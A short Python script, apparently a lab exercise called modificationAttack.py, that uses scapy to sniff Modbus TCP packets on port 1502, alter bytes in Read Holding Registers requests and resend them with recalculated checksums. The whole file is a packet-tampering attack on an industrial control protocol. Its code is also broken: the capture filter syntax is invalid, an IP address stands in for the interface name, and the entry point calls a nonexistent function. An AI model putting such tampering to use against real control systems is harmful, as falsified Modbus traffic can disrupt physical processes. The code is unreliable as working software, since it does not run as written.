from scapy.all import *
from scapy.layers.inet import IP, TCP
import socket

MODBUS_TCP_PORT = 1502

def intercept_modify(packet):
    
    if packet.haslayer(TCP) and packet[TCP].dport == MODBUS_TCP_PORT:
        if Raw in packet: # Se il pacchetto contiene il payload
            modbus_payload = bytearray(packet[Raw].load)

            if modbus_payload[7] == 3:  # Se il codice di funzione è 3 (Read Holding Registers)
                # Modifica il pacchetto
                print("Pacchetto Modbus TCP intercettato!")
                print("Pacchetto originale:", modbus_payload)

                modbus_payload[9] = 0x11
                modbus_payload[10] = 0x22

                print("Pacchetto modificato:", modbus_payload)
                packet[Raw].load = bytes(modbus_payload)
                
                # Calcola nuovi checksum
                del packet[IP].chksum
                del packet[TCP].chksum
            
    send(packet, verbose=False)

def sniff_and_process(interface):
    print("Sniffing dei pacchetti sulla rete...")
    sniff(iface=interface, filter=f"tcp port: {MODBUS_TCP_PORT}",prn=intercept_modify)

if __name__ == "__main__":
    interface = "127.0.0.1"
    modificationAttack.py(interface)